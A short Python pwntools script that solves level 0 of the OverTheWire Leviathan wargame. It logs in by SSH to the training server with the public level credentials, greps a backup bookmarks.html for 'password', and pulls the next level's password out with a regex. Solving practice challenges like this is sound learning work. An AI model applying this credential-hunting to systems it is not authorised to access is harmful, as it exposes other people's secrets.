#!/usr/bin/python3

from pwn import *
import re

log.info("Leviathan0")

shell = ssh('leviathan0', 'leviathan.labs.overthewire.org', password='leviathan0', port=2223)
sh = shell.run('sh')
sh.sendline('cd .backup; grep -i password bookmarks.html')
password = sh.recvline().decode("utf-8")
passwd = re.findall('the password for leviathan[0-8] is ?\s*(\w+)', password)


log.success('The password for leviathan1 is -> ' + passwd[0])
#log.success(sh.recvline().decode("utf-8"))





